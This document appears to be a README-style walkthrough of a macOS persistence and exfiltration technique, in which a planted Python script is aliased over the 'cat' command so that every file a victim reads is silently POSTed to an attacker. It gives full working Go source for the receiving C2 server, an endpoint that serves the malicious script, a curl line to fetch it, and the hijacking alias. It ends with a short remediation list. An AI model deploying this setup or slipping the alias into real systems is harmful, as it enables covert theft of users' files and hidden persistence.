
Assuming the Attacker is already on the target machine and would like to
establish some level of persistence on the Victim machine.
One possible way to achieve this is by modifying a binary that exists on the Victim's machine.
In a very simple form this results in the victim executing a binary they use everyday and in the
process also execute something for the Attacker. 
The Victim does not notice any difference in behviour of the standard binary.


## Scenario
This simple example with showcase how a python script can be planted on the Victim
machine and the `.bash_profile` can be updated to include and alias to this script.
The example script executes when `cat` is called on a file.
Simultaneously the contents of the file are sent to the Attacker.

```
┌───────────────┐              ┌───────────────┐
│    Victim     │              │    Attacker   │
│               │              │               │
│   spycat.py   │              │     C2.go     │
│               │              │               │
│   http POST   ├──────────────►   (log.txt)   │
│               │              │               │
└───────────────┘              └───────────────┘
```

The Victim machine will be MacOS in this case.
The Attacker machine is linux running a custom golang http server.


### Attacker Setup
The GoLang server has a single endpoint which accepts the `POST` of file data.
It writes the output to a log file `log.txt`.

Its composition is as such...

```
package main

import (
  "fmt"
  "net/http"
  "log"
  "os"
  "bytes"
  "io"
)


func ReceiveFile(w http.ResponseWriter, r *http.Request) {
    r.ParseMultipartForm(32 << 20) // limit your max input length!
    var buf bytes.Buffer
    file, header, err := r.FormFile("file")
    if err != nil {
        panic(err)
    }
    defer file.Close()
    //name := strings.Split(header.Filename, ".")
    name := header.Filename
    fmt.Printf("File name %s\n", name)
    io.Copy(&buf, file)
    contents := buf.String()
    fmt.Println(contents)
    os.WriteFile(name, buf.Bytes(), 0600)
    buf.Reset()
    return
}


func handler(w http.ResponseWriter, r *http.Request) {
  switch r.Method {
  case "POST":
    ReceiveFile(w, r)
  default:
    fmt.Fprintf(w, "Hello world")
  }
}


func main() {
  fmt.Println("Starting Server")
  http.HandleFunc("/", handler)
  log.Fatal(http.ListenAndServe(":9999", nil))
}

```

The go server can be started using `go run server.go`.

As a bonus let's add another endpoint which will simply allow for downloading the malicious script.

GET request
```
  case "GET":
    filename := "spycat.py"
    body, _ := os.ReadFile(filename)
    fmt.Fprintf(w, string(body[:]))
```

Full script can be found in the `examples` directory in `server.go`.

This script can be downloaded using any HTTP delivery mechanism,
for testing try it as CURL

```
curl -s https://localhost:8080/spycat >> spycat.py
```

### Victim Setup

A Python script can be created on the Victim machine which leverages the default
Python interpreter installed on MacOS.
Create the script on the machine or download from the Attackers C2 server.

Create an alias that points the normal `cat` command to the malicious version.

```
alias cat="python <absolute_path_to_file>/spycat.py"
```

Now whenever the Vicitim `cat`s a file the content will be displayed to there terminal as well as sent to the Attacker.

## Remediation
* Read this blogpost, ie ingest this information into TIP platform (URL, filehash)
* Update endpoint signatures or create rule
* Threat hunt for any activity
* Block malicious domains and urls on the firewall

